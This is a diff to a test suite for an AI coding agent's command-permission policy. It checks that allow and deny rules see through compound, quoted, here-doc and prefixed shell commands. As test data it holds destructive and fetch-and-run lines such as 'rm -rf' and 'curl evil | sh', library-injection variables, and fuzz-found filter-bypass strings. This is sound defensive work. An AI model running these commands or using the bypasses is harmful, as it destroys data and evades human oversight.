@@ -1,4 +1,5 @@
 import tomllib
+from pathlib import Path
 
 import pytest
 from luna_core.policy import AnchorTracker, Decision, Policy, Rules, append_rule, suggest_rule
@@ -134,12 +135,12 @@ def test_deny_rule_matches_command_with_leading_space(tmp_path):
 def test_append_rule_preserves_other_tables(tmp_path):
     cfg = tmp_path / "config.toml"
     cfg.write_text('[model]\nname = "x"\n\n[permissions]\nallow = ["read_file:*"]\n')
-    append_rule(cfg, "write_file:*")
+    append_rule(cfg, "write_file:src/*")
     text = cfg.read_text()
     assert "[model]" in text
     data = tomllib.loads(text)
     assert data["model"]["name"] == "x"
-    assert data["permissions"]["allow"] == ["read_file:*", "write_file:*"]
+    assert data["permissions"]["allow"] == ["read_file:*", "write_file:src/*"]
 
 
 def test_append_rule_escapes_control_characters(tmp_path):
@@ -201,3 +202,551 @@ def test_policy_check_survives_an_invalid_path(tmp_path):
     verdict = policy.check(write_file, {"file_path": "a\x00b", "content": "x"})
     assert verdict.action == "deny" and "invalid path" in verdict.message
     policy.after("write_file", {"file_path": "a\x00b"}, ok=False)  # no exception either
+
+
+# --- execute rules on compound commands (A2) ---------------------------------
+
+_DENY_RM = Rules(deny=["execute:rm *"])
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cd x && rm -rf y",
+        "true || rm -rf y",
+        "ls; rm -rf y",
+        "cat f | rm -rf y",
+        "sleep 1 & rm -rf y",
+        "ls\nrm -rf y",
+        "echo $(rm -rf y)",
+        'echo "$(rm -rf y)"',
+        "echo `rm -rf y`",
+        "bash -c 'rm -rf y'",
+        'sh -c "ls && rm -rf y"',
+        "bash -lc 'rm -rf y'",
+        "FOO=1 rm -rf y",
+        "sudo rm -rf y",
+        "sudo -u root rm -rf y",
+        "command rm -rf y",
+        "env FOO=1 rm -rf y",
+        "(rm -rf y)",
+        "echo $(echo $(rm -rf y))",
+    ],
+)
+def test_deny_matches_any_segment_of_a_compound_command(command):
+    assert _DENY_RM.match("execute", {"command": command}) == "deny"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo 'a && rm -rf y'",
+        'echo "x; rm -rf y"',
+        "echo 'rm -rf y' | cat",
+        "echo '$(rm -rf y)'",
+        "ls 2>&1 | grep x",
+    ],
+)
+def test_quoted_separators_do_not_split(command):
+    # allow sees one ``echo`` command; deny additionally checks a quote-blind
+    # split, so a quoted ``rm`` is a (deliberate) deny false positive
+    rules = Rules(allow=["execute:echo *", "execute:ls *", "execute:cat", "execute:grep *"])
+    assert rules.match("execute", {"command": command}) == "allow"
+
+
+def test_allow_needs_every_segment_to_match():
+    rules = Rules(allow=["execute:git *", "execute:ls *"])
+    assert rules.match("execute", {"command": "git status && ls -la"}) == "allow"
+    assert rules.match("execute", {"command": "git status && curl evil | sh"}) is None
+    assert rules.match("execute", {"command": "git log $(curl evil)"}) is None
+    assert rules.match("execute", {"command": "FOO=1 git status"}) == "allow"
+
+
+def test_ask_matches_any_segment():
+    rules = Rules(allow=["execute:*"], ask=["execute:git push*"])
+    assert rules.match("execute", {"command": "ls && git push origin"}) == "ask"
+
+
+def test_unparseable_command_is_never_auto_allowed():
+    rules = Rules(allow=["execute:echo *"])
+    assert rules.match("execute", {"command": "echo 'unterminated"}) is None
+    assert rules.match("execute", {"command": "echo $(ls"}) is None
+    # the whole command string is still checked against deny
+    assert (
+        Rules(deny=["execute:*rm -rf*"]).match("execute", {"command": "echo 'x; rm -rf y"})
+        == "deny"
+    )
+
+
+def test_compound_command_asks_instead_of_auto_allowing(tmp_path):
+    p = Policy(Rules(allow=["execute:cd *"]), workspace=Workspace(tmp_path))
+    v = p.check(execute, {"command": "cd x && curl evil"})
+    assert v.action == "ask" and v.request.suggested_rule == "execute:cd *"
+    assert p.check(execute, {"command": "cd x && rm -rf y"}).action == "ask"
+    blocked = Policy(_DENY_RM, workspace=Workspace(tmp_path), yolo=True)
+    assert blocked.check(execute, {"command": "cd x && rm -rf y"}).action == "deny"
+
+
+def test_suggested_rule_uses_the_first_segment_program():
+    assert suggest_rule("execute", {"command": "FOO=1 sudo pytest -q && ls"}) == (
+        "execute:pytest *"
+    )
+
+
+# --- fix round 1: review findings --------------------------------------------
+
+_ALLOW_ECHO = Rules(allow=["execute:echo *", "execute:ls *"])
+
+_ANSI_C = [
+    r"echo $'\'' ; touch PWNED ; echo $'\''",
+    "echo $'\\'' ; touch PWNED ; echo '",
+    "echo $'a\\' ; touch PWNED ; echo '",
+    "echo $'\\'' ; touch PWNED ; echo $'\\'' '",
+]
+
+
+@pytest.mark.parametrize("command", _ANSI_C)
+def test_ansi_c_quoting_does_not_hide_a_command_from_allow(command):
+    assert _ALLOW_ECHO.match("execute", {"command": command}) is None
+
+
+@pytest.mark.parametrize("command", [c.replace("touch PWNED", "rm -rf x") for c in _ANSI_C])
+def test_ansi_c_quoting_does_not_hide_a_command_from_deny(command):
+    assert _DENY_RM.match("execute", {"command": command}) == "deny"
+
+
+def test_ansi_c_quoted_program_is_matched():
+    assert _DENY_RM.match("execute", {"command": "$'rm' x"}) == "deny"
+    assert _ALLOW_ECHO.match("execute", {"command": "echo $'a\\tb'"}) == "allow"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat <<'EOF'\n'\nEOF\nrm -rf x",
+        "cat <<EOF\n'\nEOF\nrm -rf x; echo '",
+        "cat <<EOF\n$(rm -rf x)\nEOF",
+        "echo 'unterminated; rm -rf x",
+    ],
+)
+def test_here_docs_and_unparseable_lines_still_hit_deny_under_yolo(tmp_path, command):
+    p = Policy(_DENY_RM, workspace=Workspace(tmp_path), yolo=True)
+    assert p.check(execute, {"command": command}).action == "deny"
+
+
+def test_here_doc_body_is_data_not_commands():
+    rules = Rules(allow=["execute:cat *"])
+    assert rules.match("execute", {"command": "cat <<'EOF'\nhello; world\nEOF"}) == "allow"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "if true; then rm x; fi",
+        "for f in a; do rm $f; done",
+        "while :; do rm x; done",
+        "until false; do rm x; done",
+        "if false; then :; else rm x; fi",
+        "if false; then :; elif rm x; then :; fi",
+        "/bin/rm x",
+        "nice rm x",
+        "nice -n 5 rm x",
+        "timeout 5 rm x",
+        "timeout -s KILL 5 rm x",
+        "doas rm x",
+        "doas -u root rm x",
+        "stdbuf -o0 rm x",
+    ],
+)
+def test_keywords_paths_and_more_prefixes_hit_deny(command):
+    assert _DENY_RM.match("execute", {"command": command}) == "deny"
+
+
+def test_basename_variant_is_not_used_for_allow():
+    assert Rules(allow=["execute:rm *"]).match("execute", {"command": "/tmp/evil/rm x"}) is None
+
+
+def test_redirection_forms_are_not_separators():
+    rules = Rules(allow=["execute:echo *"])
+    assert rules.match("execute", {"command": "echo hi >| out.txt"}) == "allow"
+    assert rules.match("execute", {"command": "echo a\\\nb"}) == "allow"
+
+
+# Cross-check against a real shell: whatever ``sh`` would run must be visible.
+_TOKS = ["$'", "'", "\\", '"', "\\'", "#", "`", "a", "$(", ")", "${", "}", "\n"]
+_TAILS = ["", "'", "$'", '"', "\\'", "#'", "`"]
+
+
+def _corpus(max_len: int) -> list[str]:
+    import itertools
+
+    out = []
+    for size in range(1, max_len + 1):
+        for combo in itertools.product(_TOKS, repeat=size):
+            for tail in _TAILS:
+                out.append("echo " + "".join(combo) + " ; touch PWNED ; echo " + tail)
+    return out
+
+
+def _sh_creates_pwned(command: str, tmp_path) -> bool:
+    import subprocess
+
+    marker = tmp_path / "PWNED"
+    marker.unlink(missing_ok=True)
+    subprocess.run(["/bin/sh", "-c", command], cwd=tmp_path, capture_output=True, timeout=5)
+    return marker.exists()
+
+
+@pytest.mark.skipif(not Path("/bin/sh").exists(), reason="needs /bin/sh")
+def test_fuzz_allow_never_approves_a_line_that_runs_touch(tmp_path):
+    allowed = [c for c in _corpus(3) if _ALLOW_ECHO.match("execute", {"command": c}) == "allow"]
+    leaks = [c for c in allowed if _sh_creates_pwned(c, tmp_path)]
+    assert leaks == []
+
+
+@pytest.mark.skipif(not Path("/bin/sh").exists(), reason="needs /bin/sh")
+def test_fuzz_deny_catches_every_line_that_runs_touch(tmp_path):
+    rules = Rules(deny=["execute:touch *"])
+    missed = [
+        c
+        for c in _corpus(2)
+        if rules.match("execute", {"command": c}) != "deny" and _sh_creates_pwned(c, tmp_path)
+    ]
+    assert missed == []
+
+
+@pytest.mark.skipif(not Path("/bin/sh").exists(), reason="needs /bin/sh")
+def test_fuzz_parser_alone_sees_every_command_sh_runs(tmp_path):
+    """Without the quote-blind safety net, the parser must either see ``touch`` or give up."""
+    from luna_core.shellsplit import split_command
+
+    def sees_touch(command: str) -> bool:
+        readings = [split_command(command), split_command(command, ansi_c=False)]
+        return any(p is None or "touch PWNED" in p.commands for p in readings)
+
+    missed = [c for c in _corpus(2) if not sees_touch(c) and _sh_creates_pwned(c, tmp_path)]
+    assert missed == []
+
+
+# --- fix round 2 --------------------------------------------------------------
+
+_ALLOW_CAT = Rules(allow=["execute:echo *", "execute:cat *"])
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat <<'E'$\"\"\nE\ntouch PWNED",
+        "echo <<'E'$\"\"\nE\n#\ntouch PWNED",
+        'cat <<E""\nE\ntouch PWNED',
+        'cat <<"E"x\nEx\ntouch PWNED',
+        "cat <<E\\\nE\ntouch PWNED",
+        "echo  }${<<-E<<'E' }\ntouch PWNED\t",
+        "cat <<E\nnever terminated\ntouch PWNED",
+    ],
+)
+def test_odd_here_doc_delimiters_are_never_auto_allowed(command):
+    assert _ALLOW_CAT.match("execute", {"command": command}) is None
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        ">/dev/null rm -rf x",
+        "2>&1 rm x",
+        "</dev/null rm x",
+        ">f rm x",
+        "> f rm x",
+        "<<'E' rm x",
+        "echo ;<<'E' rm x",
+        "sudo >/dev/null rm x",
+        "rm",
+    ],
+)
+def test_leading_redirections_do_not_hide_the_program(command):
+    assert _DENY_RM.match("execute", {"command": command}) == "deny"
+
+
+_EVERYDAY = Rules(
+    allow=[
+        f"execute:{p} *"
+        for p in ("git pytest echo ls uv grep cat python npm cd head wc sed find tail".split())
+    ]
+)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'git commit -m "fix; thing"',
+        "pytest -k 'a or b'",
+        "echo $'a\\tb'",
+        'git log --format="%h | %s" -5',
+        "uv run pytest -q 2>&1 | tail -2",
+        "ls -la && git status",
+        "grep -rn 'foo|bar' .",
+        "cd src && ls",
+        'git commit -m "$(cat msg.txt)"',
+        "cat <<'EOF' > f.txt\nhello; rm x\nEOF",
+        'echo "it\'s"',
+        "pytest tests/ -x",
+        "find . -name '*.py' | head",
+        "sed -n '1,5p' f",
+        "python -c 'print(1); print(2)'",
+        "npm run build -- --mode=prod",
+        "git commit -m 'a (b) c'",
+        "echo ${HOME}",
+        "ls *.py",
+        "git diff HEAD~1 -- 'a b.py'",
+        r"echo a\;b",
+        "ls # list",
+        "ls",
+    ],
+)
+def test_everyday_commands_stay_auto_allowed(command):
+    assert _EVERYDAY.match("execute", {"command": command}) == "allow"
+
+
+def test_suggested_rules_cover_every_command_not_yet_allowed(tmp_path):
+    p = Policy(Rules(allow=["execute:git *"]), workspace=Workspace(tmp_path))
+    request = p.check(execute, {"command": "cd src && ls && git status"}).request
+    assert request.suggested_rule == "execute:cd *"
+    assert request.suggested_rules == ("execute:cd *", "execute:ls *")
+    for rule in request.suggested_rules:
+        p.remember_always(rule)
+    assert p.check(execute, {"command": "cd src && ls && git status"}).action == "allow"
+
+
+def test_suggested_rules_for_a_simple_call():
+    from luna_core.policy import suggest_rules
+
+    assert suggest_rules("write_file", {"file_path": "a.txt"}) == ("write_file:a.txt",)
+    assert suggest_rules("execute", {"command": "cd x && ls"}) == ("execute:cd *", "execute:ls *")
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo &<<'E'${\\\n}<<-E touch PWNED&\n \\\"",
+        'echo \\\n\n<<-E}#\\"a touch PWNED\nif then ',
+        "echo \n<<'E'\\\n\\= touch PWNED }",
+        "echo \nE\n=;<<-E<<E\\\n* touch PWNED",
+        "echo \\;|<<-E<<'E'\\\n= touch PWNED",
+    ],
+)
+def test_fuzz_found_deny_bypasses(command):
+    assert Rules(deny=["execute:touch *"]).match("execute", {"command": command}) == "deny"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo |<<'E'\\ }\"a touch PWNED",
+        "echo \n<<-E$()\\\nE touch PWNED",
+        "echo &<<-E'<<'E' ${$' touch PWNED",
+        ">'a b' touch PWNED",
+    ],
+)
+def test_redirection_targets_with_spaces_do_not_hide_the_program(command):
+    assert Rules(deny=["execute:touch *"]).match("execute", {"command": command}) == "deny"
+
+
+# --- fix round 3: "always" must never persist a catch-all rule -----------------
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'ls && "*" x',
+        "ls\n*",
+        "ls `*`",
+        'eval "*"',
+        "ls && ? x",
+        "ls && [a-z]* x",
+        "ls && $X y",
+        "ls | xargs rm",
+        "ls && find . -delete",
+    ],
+)
+def test_no_multi_rule_always_when_a_command_has_no_safe_rule(tmp_path, command):
+    p = Policy(Rules(), workspace=Workspace(tmp_path))
+    request = p.check(execute, {"command": command}).request
+    assert request.suggested_rules == ()
+
+
+@pytest.mark.parametrize(
+    "rule",
+    [
+        "execute:* *",
+        "execute:*",
+        "*:*",
+        "execute:? *",
+        "execute:[a-z]* *",
+        "execute:$X *",
+        "execute:bash *",
+        "execute:sudo *",
+        "execute:eval *",
+        "execute:xargs *",
+        'execute:"*" *',
+    ],
+)
+def test_unsafe_execute_allow_rules_are_never_saved(tmp_path, rule):
+    from luna_core.policy import UnsafeRule
+
+    saved = []
+    p = Policy(Rules(), workspace=Workspace(tmp_path), persist_rule=saved.append)
+    with pytest.raises(UnsafeRule):
+        p.remember_always(rule)
+    assert p.rules.allow == [] and saved == []
+    with pytest.raises(UnsafeRule):
+        append_rule(tmp_path / "permissions.toml", rule)
+    assert not (tmp_path / "permissions.toml").exists()
+
+
+def test_safe_rules_still_save(tmp_path):
+    for rule in ("execute:pytest *", "execute:./run.sh *", "write_file:src/*", "execute:git log *"):
+        append_rule(tmp_path / "p.toml", rule)
+    assert append_rule(tmp_path / "p.toml", "execute:rm *", kind="deny")
+
+
+# --- fix round 3: the rough deny net must not silently give up -----------------
+
+
+_CAP_LINES = [
+    ">/dev/null " * n + ">'a b' touch PWNED" + tail
+    for n in (3, 70)
+    for tail in ("", " <<'E'$\"\"", "\n'")
+]
+
+
+@pytest.mark.parametrize("command", _CAP_LINES)
+def test_many_redirections_still_hit_deny_under_yolo(tmp_path, command):
+    p = Policy(Rules(deny=["execute:touch *"]), workspace=Workspace(tmp_path), yolo=True)
+    assert p.check(execute, {"command": command}).action == "deny"
+
+
+def test_rough_overflow_fails_closed(tmp_path, monkeypatch):
+    import luna_core.shellsplit as shellsplit
+
+    monkeypatch.setattr(shellsplit, "_MAX_ROUGH_CUTS", 2)
+    line = "echo >a >b >'c d' x <<'E'$\"\""  # unparseable, and the cut budget runs out
+    assert shellsplit.rough_split(line)[1] is False
+    deny = Policy(Rules(deny=["execute:rm *"]), workspace=Workspace(tmp_path), yolo=True)
+    assert deny.check(execute, {"command": line}).action == "deny"
+    plain = Policy(Rules(), workspace=Workspace(tmp_path), yolo=True)
+    assert plain.check(execute, {"command": line}).action == "ask"  # yolo cannot skip it
+
+
+def test_long_unparseable_line_fails_closed(tmp_path):
+    line = "echo " + "x " * 3000 + "'"
+    assert Rules(deny=["execute:rm *"]).match("execute", {"command": line}) == "deny"
+    assert Rules().match("execute", {"command": line}) == "ask"
+
+
+# --- allow never covers a privilege prefix or a code-injecting variable ---------
+
+_ALLOW_GIT = Rules(allow=["execute:git *", "execute:ls *"])
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sudo git status",
+        "doas git status",
+        "env git status",
+        "env X=1 git status",
+        "exec git status",
+        "command git status",
+        "LD_PRELOAD=evil.so git status",
+        "DYLD_INSERT_LIBRARIES=x git status",
+        "PATH=/tmp/evil:$PATH git status",
+        "GIT_SSH_COMMAND='sh -c evil' git fetch",
+        "GIT_CONFIG_GLOBAL=/tmp/c git status",
+        "GIT_EXEC_PATH=/tmp git status",
+        "PYTHONPATH=/tmp git status",
+        "NODE_OPTIONS=--require=x git status",
+        "BASH_ENV=/tmp/x git status",
+        "IFS=x git status",
+        "ls && sudo git status",
+    ],
+)
+def test_allow_does_not_cover_privilege_prefixes_or_injecting_variables(command):
+    assert _ALLOW_GIT.match("execute", {"command": command}) is None
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["time git status", "nice git log", "timeout 5 git status", "stdbuf -o0 git log",
+     "FOO=1 git status", "GIT_PAGER_IN_USE=1 git log"],
+)  # fmt: skip
+def test_harmless_prefixes_and_assignments_still_allow(command):
+    assert _ALLOW_GIT.match("execute", {"command": command}) == "allow"
+
+
+def test_deny_still_sees_through_privilege_prefixes():
+    assert _DENY_RM.match("execute", {"command": "sudo LD_PRELOAD=x rm -rf /"}) == "deny"
+
+
+# --- fix round 4: file-tool "always" rules match only the literal path ----------
+
+
+@pytest.mark.parametrize(
+    ("path", "rule"),
+    [
+        ("*", "write_file:[*]"),
+        ("**", "write_file:[*][*]"),
+        ("src/[a-z]*", "write_file:src/[[]a-z][*]"),
+        ("a?.py", "write_file:a[?].py"),
+        ("src/a.py", "write_file:src/a.py"),
+    ],
+)
+def test_file_rules_escape_glob_characters(path, rule):
+    assert suggest_rule("write_file", {"file_path": path}) == rule
+    rules = Rules(allow=[rule])
+    assert rules.match("write_file", {"file_path": path}) == "allow"
+    assert rules.match("write_file", {"file_path": "other.py"}) is None
+
+
+@pytest.mark.parametrize(
+    "rule",
+    ["write_file:*", "delete:**", "write:*/**", "fs:/**", "edit_file:./*", "delete:**/*"],
+)
+def test_catch_all_file_rules_are_never_saved(tmp_path, rule):
+    from luna_core.policy import UnsafeRule
+
+    p = Policy(Rules(), workspace=Workspace(tmp_path))
+    with pytest.raises(UnsafeRule):
+        p.remember_always(rule)
+    with pytest.raises(UnsafeRule):
+        append_rule(tmp_path / "permissions.toml", rule)
+    assert p.rules.allow == []
+
+
+def test_pager_and_editor_variables_are_not_auto_allowed():
+    for var in ("PAGER", "GIT_PAGER", "GIT_EDITOR", "EDITOR", "VISUAL", "LESSOPEN",
+                "LESSCLOSE", "MANPAGER"):  # fmt: skip
+        assert _ALLOW_GIT.match("execute", {"command": f"{var}='rm x' git log"}) is None
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("for f in a b; do echo $f; done", ("execute:echo *",)),
+        ("if test -f x; then ls; fi", ("execute:test *", "execute:ls *")),
+        ("case $x in a) ls;; esac", ("execute:ls *",)),
+        ("{ ls; }", ("execute:ls *",)),
+    ],
+)
+def test_suggested_rules_skip_shell_syntax(command, expected):
+    from luna_core.policy import suggest_rules
+
+    assert suggest_rules("execute", {"command": command}) == expected
+
+
+def test_shell_syntax_words_do_not_stop_allow_rules_from_matching(tmp_path):
+    p = Policy(Rules(allow=["execute:echo *"]), workspace=Workspace(tmp_path))
+    assert p.check(execute, {"command": "for f in a b; do echo $f; done"}).action == "allow"
+    # a redirect on the terminator is a write, not syntax
+    assert p.check(execute, {"command": "for f in a; do echo $f; done > out.txt"}).action == "ask"
+    # a substitution in the header is still checked on its own
+    assert p.check(execute, {"command": "for f in $(rm x); do echo; done"}).action == "ask"
